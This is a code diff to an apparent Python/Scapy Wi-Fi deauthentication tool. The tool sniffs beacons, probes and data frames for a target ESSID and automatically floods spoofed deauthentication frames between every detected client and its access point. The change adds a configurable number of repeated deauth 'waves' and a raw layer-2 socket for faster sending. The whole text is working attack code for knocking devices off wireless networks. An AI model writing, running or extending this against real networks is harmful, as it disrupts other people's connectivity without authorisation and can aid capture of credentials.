@@ -13,8 +13,9 @@
 
 import sys
 import argparse
-from scapy import sendrecv
 from scapy.layers import dot11
+from scapy.config import conf as scapy_conf
+from scapy.sendrecv import sniff as scapy_sniff
 
 BPF_DOT11_BEACON = 'wlan type mgt subtype beacon'
 BPF_DOT11_PROBE_REQ = 'wlan type mgt subtype probe-req'
@@ -110,30 +111,31 @@ def register_sta(wifi_essid, bssid_sta, bssid_ap, bssids_stas_dict):
     except Exception as e:
         raise MsgException(e, 'Detected station could not be registered')
 
-def unicast_deauth(wifi_interface, bssid_sta, bssid_ap, bssid_network):
+def unicast_deauth(wifi_interface, bssid_sta, bssid_ap, bssid_network, deauth_waves):
     '''unicast deauthentication'''
     
     try:
-        print_info(f'sending {DEAUTH_COUNT} deauthentication frames from AP {bssid_ap} to STA {bssid_sta} ...')
-        sendrecv.sendp(
-            dot11.RadioTap() / dot11.Dot11(addr1 = bssid_sta, addr2 = bssid_ap, addr3 = bssid_network) / dot11.Dot11Deauth(reason = 7),
-            iface = wifi_interface,
-            count = DEAUTH_COUNT,
-            inter = DEAUTH_INTER,
-            verbose = False,
-        )
-        print_info(f'sending {DEAUTH_COUNT} deauthentication frames from STA {bssid_sta} to AP {bssid_ap} ...')
-        sendrecv.sendp(
-            dot11.RadioTap() / dot11.Dot11(addr1 = bssid_ap, addr2 = bssid_sta, addr3 = bssid_network) / dot11.Dot11Deauth(reason = 7),
-            iface = wifi_interface,
-            count = DEAUTH_COUNT,
-            inter = DEAUTH_INTER,
-            verbose = False,
-        )
+        unicast_deauth_socket = scapy_conf.L2socket(iface = wifi_interface)
+        print_info(f'sending {deauth_waves} x {DEAUTH_COUNT} deauthentication frames from AP {bssid_ap} to STA {bssid_sta} ...')
+        print_info(f'sending {deauth_waves} x {DEAUTH_COUNT} deauthentication frames from STA {bssid_sta} to AP {bssid_ap} ...')
+        for i in range(deauth_waves):
+            for i in range(DEAUTH_COUNT):
+                unicast_deauth_socket.send(
+                    dot11.RadioTap() /
+                    dot11.Dot11(addr1 = bssid_sta, addr2 = bssid_ap, addr3 = bssid_network) /
+                    dot11.Dot11Deauth(reason = 7)
+                )
+            for i in range(DEAUTH_COUNT):
+                unicast_deauth_socket.send(
+                    dot11.RadioTap() /
+                    dot11.Dot11(addr1 = bssid_ap, addr2 = bssid_sta, addr3 = bssid_network) /
+                    dot11.Dot11Deauth(reason = 7)
+                )
+        unicast_deauth_socket.close()
     except Exception as e:
         raise MsgException(e, 'Deauthentication frames could not be sent')
 
-def sniffer_wrapper(wifi_interface, wifi_essid, bssids_whitelist, bssids_aps_dict, bssids_stas_dict):
+def sniffer_wrapper(wifi_interface, wifi_essid, deauth_waves, bssids_whitelist, bssids_aps_dict, bssids_stas_dict):
     def sniffer_handler(frame):
         '''sniffed frame processing'''
         
@@ -167,10 +169,10 @@ def sniffer_wrapper(wifi_interface, wifi_essid, bssids_whitelist, bssids_aps_dic
                 else:
                     if bssids_aps_dict.get(bssid_src) and (bssids_stas_dict.get(bssid_dst) != bssid_src) and is_unicast(bssid_dst):
                         register_sta(wifi_essid, bssid_dst, bssid_src, bssids_stas_dict)
-                        unicast_deauth(wifi_interface, bssid_dst, bssid_src, bssid_network)
+                        unicast_deauth(wifi_interface, bssid_dst, bssid_src, bssid_network, deauth_waves)
                     elif bssids_aps_dict.get(bssid_dst) and (bssids_stas_dict.get(bssid_src) != bssid_dst):
                         register_sta(wifi_essid, bssid_src, bssid_dst, bssids_stas_dict)
-                        unicast_deauth(wifi_interface, bssid_src, bssid_dst, bssid_network)
+                        unicast_deauth(wifi_interface, bssid_src, bssid_dst, bssid_network, deauth_waves)
         
         except Exception as e:
             raise MsgException(e, 'Sniffed frames could not be processed')
@@ -194,6 +196,14 @@ def main():
             required = True,
         )
         parser.add_argument(
+            '-n',
+            dest = 'deauth_waves',
+            help = 'Number of deauthentication waves',
+            required = False,
+            type = int,
+            default = 1,
+        )
+        parser.add_argument(
             '-wl',
             dest = 'bssids_whitelist',
             help = 'Comma-separated BSSIDs whitelist',
@@ -204,7 +214,7 @@ def main():
         args = parser.parse_args()
         bssids_aps_dict = {} # {ap bssid: network bssid}
         bssids_stas_dict = {} # {sta bssid: ap bssid}
-        sendrecv.sniff(
+        scapy_sniff(
             iface = args.wifi_interface,
             filter =
                 BPF_DOT11_BEACON + ' or ' +
@@ -212,7 +222,14 @@ def main():
                 BPF_DOT11_PROBE_RESP + ' or ' +
                 BPF_DOT11_CONTROL + ' or ' +
                 BPF_DOT11_DATA,
-            prn = sniffer_wrapper(args.wifi_interface, args.wifi_essid, args.bssids_whitelist, bssids_aps_dict, bssids_stas_dict),
+            prn = sniffer_wrapper(
+                args.wifi_interface,
+                args.wifi_essid,
+                args.deauth_waves,
+                args.bssids_whitelist,
+                bssids_aps_dict,
+                bssids_stas_dict,
+            ),
         )
     except MsgException as msg_exception:
         panic(msg_exception)
